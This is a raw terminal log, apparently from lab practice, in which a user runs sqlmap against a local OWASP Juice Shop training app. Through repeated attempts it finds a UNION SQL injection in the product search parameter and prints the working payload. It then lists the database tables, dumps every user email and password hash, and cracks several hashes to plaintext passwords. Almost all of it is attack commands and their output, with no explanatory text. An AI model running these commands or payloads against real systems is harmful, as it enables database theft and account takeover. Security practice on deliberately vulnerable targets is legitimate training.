@@ -1,0 +1,581 @@
+$ sqlmap --wizard
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:14:16 /2026-11-23/
+
+[15:14:16] [INFO] starting wizard interface
+http://localhost:3000/#/login
+POST data (--data) [Enter for None]: 
+
+[15:14:41] [WARNING] no GET and/or POST parameter(s) found for testing (e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). Will search for forms
+Injection difficulty (--level/--risk). Please choose:
+[1] Normal (default)
+[2] Medium
+[3] Hard
+> 
+
+Enumeration (--banner/--current-user/etc). Please choose:
+[1] Basic (default)
+[2] Intermediate
+[3] All
+> 
+
+
+sqlmap is running, please wait..
+
+[15:14:43] [CRITICAL] there were no forms found at the given target URL
+
+[*] ending @ 15:14:43 /2026-11-23/
+
+┌──(calvin㉿kali)-[~]
+└─$ ^[[200~sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --batch~
+zsh: bad pattern: ^[[200~sqlmap
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --batch~  
+        ___
+       __H__                                                                 
+ ___ ___[']_____ ___ ___  {1.10.8#stable}                                    
+|_ -| . [(]     | .'| . |                                                    
+|___|_  [)]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --batch~
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --batch 
+        ___
+       __H__                                                                 
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}                                    
+|_ -| . [(]     | .'| . |                                                    
+|___|_  [']_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:15:59 /2026-11-23/
+
+[15:16:00] [INFO] testing connection to the target URL
+[15:16:00] [INFO] checking if the target is protected by some kind of WAF/IPS
+[15:16:00] [INFO] testing if the target URL content is stable
+[15:16:00] [INFO] target URL content is stable
+[15:16:00] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[15:16:00] [INFO] testing for SQL injection on GET parameter 'q'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[15:16:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:16:00] [WARNING] GET parameter 'q' does not seem to be injectable
+[15:16:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[15:16:00] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 6 times
+
+[*] ending @ 15:16:00 /2026-11-23/
+
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a"
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}                                    
+|_ -| . [(]     | .'| . |                                                    
+|___|_  [,]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:16:35 /2026-11-23/
+
+[15:16:35] [INFO] testing connection to the target URL
+[15:16:35] [INFO] testing if the target URL content is stable
+[15:16:35] [INFO] target URL content is stable
+[15:16:35] [INFO] testing if GET parameter 'q' is dynamic
+[15:16:35] [INFO] GET parameter 'q' appears to be dynamic
+[15:16:35] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[15:16:35] [INFO] testing for SQL injection on GET parameter 'q'
+[15:16:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:16:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
+[15:16:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                      
+[15:16:36] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                           
+[15:16:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                     
+[15:16:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                     
+[15:16:36] [INFO] testing 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)'                                                        
+[15:16:36] [INFO] testing 'Generic inline queries'
+[15:16:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:16:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                         
+[15:16:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                  
+[15:16:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[15:16:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:16:36] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[15:16:36] [INFO] testing 'Oracle AND time-based blind'
+[15:16:36] [INFO] testing 'CUBRID AND time-based blind (SLEEP)'
+[15:16:36] [INFO] testing 'CUBRID OR time-based blind (SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 
+
+[15:16:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:16:40] [WARNING] GET parameter 'q' does not seem to be injectable
+[15:16:40] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                              
+[15:16:40] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 41 times
+
+[*] ending @ 15:16:40 /2026-11-23/
+
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?"   
+        ___
+       __H__                                                                 
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}                                    
+|_ -| . [']     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:16:50 /2026-11-23/
+
+[15:16:50] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+do you want to try URI injections in the target URL itself? [Y/n/q] 
+
+[15:16:52] [INFO] testing connection to the target URL
+[15:16:53] [INFO] testing if the target URL content is stable
+[15:16:53] [INFO] target URL content is stable
+[15:16:53] [INFO] testing if URI parameter '#1*' is dynamic
+[15:16:53] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[15:16:53] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[15:16:53] [INFO] testing for SQL injection on URI parameter '#1*'
+[15:16:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:16:53] [WARNING] reflective value(s) found and filtering out
+[15:16:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
+[15:16:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                      
+[15:16:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                           
+[15:16:53] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                     
+[15:16:53] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                     
+[15:16:53] [INFO] testing 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)'                                                        
+[15:16:54] [INFO] testing 'Generic inline queries'
+[15:16:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:16:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                         
+[15:16:54] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                  
+[15:16:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[15:16:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:16:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[15:16:54] [INFO] testing 'Oracle AND time-based blind'
+[15:16:54] [INFO] testing 'CUBRID AND time-based blind (SLEEP)'
+[15:16:54] [INFO] testing 'CUBRID OR time-based blind (SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 
+
+[15:16:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:16:57] [WARNING] URI parameter '#1*' does not seem to be injectable
+[15:16:57] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                              
+[15:16:57] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 93 times
+
+[*] ending @ 15:16:57 /2026-11-23/
+
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ 
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 --batch  
+        ___
+       __H__                                                                 
+ ___ ___[.]_____ ___ ___  {1.10.8#stable}                                    
+|_ -| . [.]     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:19:04 /2026-11-23/
+
+[15:19:04] [INFO] testing connection to the target URL
+[15:19:04] [INFO] testing if the target URL content is stable
+[15:19:05] [INFO] target URL content is stable
+[15:19:05] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[15:19:05] [INFO] testing for SQL injection on GET parameter 'q'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[15:19:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:19:05] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[15:19:05] [INFO] target URL appears to have 10 columns in query
+[15:19:05] [WARNING] reflective value(s) found and filtering out
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[15:19:05] [INFO] GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable                                                          
+[15:19:05] [INFO] checking if the injection point on GET parameter 'q' is a false positive
+[15:19:05] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
+GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:19:05] [INFO] testing SQLite
+[15:19:05] [INFO] confirming SQLite
+[15:19:05] [INFO] actively fingerprinting SQLite
+[15:19:05] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:19:05] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 67 times
+[15:19:05] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'                                             
+
+[*] ending @ 15:19:05 /2026-11-23/
+
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 --tables --batch
+        ___
+       __H__                                                                 
+ ___ ___[']_____ ___ ___  {1.10.8#stable}                                    
+|_ -| . [']     | .'| . |                                                    
+|___|_  [.]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:21:43 /2026-11-23/
+
+[15:21:43] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:21:43] [INFO] testing SQLite
+[15:21:43] [INFO] confirming SQLite
+[15:21:43] [INFO] actively fingerprinting SQLite
+[15:21:43] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:21:43] [INFO] fetching tables for database: 'SQLite_masterdb'
+[15:21:43] [WARNING] reflective value(s) found and filtering out
+<current>                                                                   
+[22 tables]
++-----------------------+
+| Addresses             |
+| BasketItems           |
+| Baskets               |
+| Captchas              |
+| Cards                 |
+| ChallengeDependencies |
+| Challenges            |
+| Complaints            |
+| Deliveries            |
+| Feedbacks             |
+| Hints                 |
+| ImageCaptchas         |
+| Memories              |
+| PrivacyRequests       |
+| Products              |
+| Quantities            |
+| Recycles              |
+| SecurityAnswers       |
+| SecurityQuestions     |
+| Users                 |
+| Wallets               |
+| sqlite_sequence       |
++-----------------------+
+
+[15:21:43] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 23 times
+[15:21:43] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'                                             
+
+[*] ending @ 15:21:43 /2026-11-23/
+
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ ^[[200~sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users --columns --batch~
+zsh: bad pattern: ^[[200~sqlmap
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ 200~sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users --columns --batch~  
+200~sqlmap: command not found
+                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users --columns --batch~ 
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --batch~
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users --columns --batch 
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.8#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:23:10 /2026-11-23/
+
+[15:23:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:23:10] [INFO] testing SQLite
+[15:23:10] [INFO] confirming SQLite
+[15:23:10] [INFO] actively fingerprinting SQLite
+[15:23:10] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:23:10] [INFO] fetching columns for table 'Users' 
+[15:23:10] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[15:23:10] [WARNING] unable to retrieve column names for table 'Users' 
+do you want to use common column existence check? [y/N/q] N
+[15:23:10] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+[15:23:10] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 15:23:10 /2026-11-23/
+
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users --columns --batch
+        ___
+       __H__                                                                                                 
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}                                                                    
+|_ -| . [)]     | .'| . |                                                                                    
+|___|_  [,]_|_|_|__,|  _|                                                                                    
+      |_|V...       |_|   https://sqlmap.org                                                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:23:25 /2026-11-23/
+
+[15:23:25] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:23:25] [INFO] testing SQLite
+[15:23:25] [INFO] confirming SQLite
+[15:23:25] [INFO] actively fingerprinting SQLite
+[15:23:25] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:23:25] [INFO] fetching columns for table 'Users' 
+[15:23:25] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[15:23:25] [WARNING] unable to retrieve column names for table 'Users' 
+do you want to use common column existence check? [y/N/q] N
+[15:23:25] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+[15:23:25] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 15:23:25 /2026-11-23/
+
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ ^[[200~sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users -C email,password --dump --batc  
+zsh: bad pattern: ^[[200~sqlmap
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users -C email,password --dump --batch
+        ___
+       __H__                                                                                                 
+ ___ ___[']_____ ___ ___  {1.10.8#stable}                                                                    
+|_ -| . [)]     | .'| . |                                                                                    
+|___|_  [)]_|_|_|__,|  _|                                                                                    
+      |_|V...       |_|   https://sqlmap.org                                                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:24:01 /2026-11-23/
+
+[15:24:01] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:24:01] [INFO] testing SQLite
+[15:24:01] [INFO] confirming SQLite
+[15:24:01] [INFO] actively fingerprinting SQLite
+[15:24:01] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:24:01] [INFO] fetching entries of column(s) 'email,password' for table 'Users'
+[15:24:01] [WARNING] reflective value(s) found and filtering out
+[15:24:02] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[15:24:02] [WARNING] unable to retrieve the entries of columns 'email,password' for table 'Users' in database 'SQLite_masterdb'
+[15:24:02] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 26 times
+[15:24:02] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 15:24:02 /2026-11-23/
+
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users -C email --dump --no-cast --batch
+        ___
+       __H__                                                                                                 
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}                                                                    
+|_ -| . [,]     | .'| . |                                                                                    
+|___|_  [(]_|_|_|__,|  _|                                                                                    
+      |_|V...       |_|   https://sqlmap.org                                                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:25:09 /2026-11-23/
+
+[15:25:09] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:25:09] [INFO] testing SQLite
+[15:25:09] [INFO] confirming SQLite
+[15:25:09] [INFO] actively fingerprinting SQLite
+[15:25:09] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:25:09] [INFO] fetching entries of column(s) 'email' for table 'Users'
+[15:25:09] [WARNING] reflective value(s) found and filtering out
+Database: <current>
+Table: Users
+[24 entries]
++----------------------------+
+| email                      |
++----------------------------+
+| J12934@juice-sh.op         |
+| accountant@juice-sh.op     |
+| admin@juice-sh.op          |
+| amy@juice-sh.op            |
+| basil@juice-sh.op          |
+| bender@juice-sh.op         |
+| bjoern.kimminich@gmail.com |
+| bjoern@juice-sh.op         |
+| bjoern@owasp.org           |
+| chris.pike@juice-sh.op     |
+| ciso@juice-sh.op           |
+| cloud-admin@juice-sh.op    |
+| demo                       |
+| emma@juice-sh.op           |
+| ethereum@juice-sh.op       |
+| jim@juice-sh.op            |
+| john@juice-sh.op           |
+| mc.safesearch@juice-sh.op  |
+| morty@juice-sh.op          |
+| stan@juice-sh.op           |
+| support@juice-sh.op        |
+| testing@juice-sh.op        |
+| uvogin@juice-sh.op         |
+| wurstbrot@juice-sh.op      |
++----------------------------+
+
+[15:25:09] [INFO] table 'SQLite_masterdb.Users' dumped to CSV file '/home/calvin/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/Users.csv'                                                                     
+[15:25:09] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 15:25:09 /2026-11-23/
+
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q --dbms=sqlite --technique=U --level=3 -T Users -C password --dump --no-cast --batch
+        ___
+       __H__                                                                                                 
+ ___ ___[(]_____ ___ ___  {1.10.8#stable}                                                                    
+|_ -| . ["]     | .'| . |                                                                                    
+|___|_  ["]_|_|_|__,|  _|                                                                                    
+      |_|V...       |_|   https://sqlmap.org                                                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:25:33 /2026-11-23/
+
+[15:25:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: q=a')) UNION ALL SELECT 17,17,17,17,17,17,17,17,CHAR(113,122,122,118,113)||CHAR(114,120,85,100,68,112,111,115,76,77)||CHAR(113,120,113,113,113),17-- UcTF
+---
+[15:25:33] [INFO] testing SQLite
+[15:25:33] [INFO] confirming SQLite
+[15:25:33] [INFO] actively fingerprinting SQLite
+[15:25:33] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:25:33] [INFO] fetching entries of column(s) 'password' for table 'Users'
+[15:25:33] [WARNING] reflective value(s) found and filtering out
+[15:25:33] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[15:25:33] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[15:25:33] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[15:25:33] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[15:25:33] [INFO] starting 5 processes 
+[15:25:34] [INFO] cracked password 'admin123' for hash '0192023a7bbd73250516f069df18b500'                   
+[15:25:35] [INFO] cracked password 'demo' for hash 'fe01ce2a7fbac8fafaed7c982a04e229'                       
+[15:25:35] [INFO] cracked password 'ncc-1701' for hash 'e541ca7ecf72b8d1286474fc613e5e45'                   
+[15:25:35] [INFO] cracked password 'private' for hash '2c17c6393771ee3048ae34d6b380c5ec'                    
+Database: <current>                                                                                         
+Table: Users
+[24 entries]
++---------------------------------------------+
+| password                                    |
++---------------------------------------------+
+| 0192023a7bbd73250516f069df18b500 (admin123) |
+| e541ca7ecf72b8d1286474fc613e5e45 (ncc-1701) |
+| 0c36e517e3fa95aabf1bbffc6744a4ef            |
+| 6edd9d726cbdc873c539e41ae8757b8c            |
+| 861917d5fa5f1172f931dc700d81a8fb            |
+| 3869433d74e3d0c86fd25562f836bc82            |
+| f2f933d0bb0ba057bc8e33b8ebd6d9e8            |
+| b03f4b0ba8b458fa0acdc02cdb953bc8            |
+| 3c2abc04e4a6ea8f1327d0aae3714b7d            |
+| 9ad5b0492bbe528583e128d2a8941de4            |
+| 030f05e45e30710c3ad3c32f00de0473            |
+| 7f311911af16fa8f418dd1a3051d6810            |
+| 9283f1b2e9669749081963be0462e466            |
+| 10a783b9ed19ea1c67c3a27699f0095b            |
+| 963e10f92a70b4b463220cb4c5d636dc            |
+| 05f92148b4b60f7dacd04cceebb8f1af            |
+| fe01ce2a7fbac8fafaed7c982a04e229 (demo)     |
+| 00479e957b6b42c459ee5746478e4d45            |
+| 402f1c4a75e316afec5a6ea63147f739            |
+| e9048a3f43dd5e094ef733f3bd88ea64            |
+| 2c17c6393771ee3048ae34d6b380c5ec (private)  |
+| b616a64605a07941fbd31868aea3b54b            |
+| 127af90bb4cd56817d123db3788ab502            |
+| 1d75226504523f04d2b239a7fb2990fd            |
++---------------------------------------------+
+
+[15:25:36] [INFO] table 'SQLite_masterdb.Users' dumped to CSV file '/home/calvin/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/Users.csv'                                                                     
+[15:25:36] [INFO] fetched data logged to text files under '/home/calvin/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 15:25:36 /2026-11-23/
+
+                                                                                                             
+┌──(calvin㉿kali)-[~]
+└─$ 
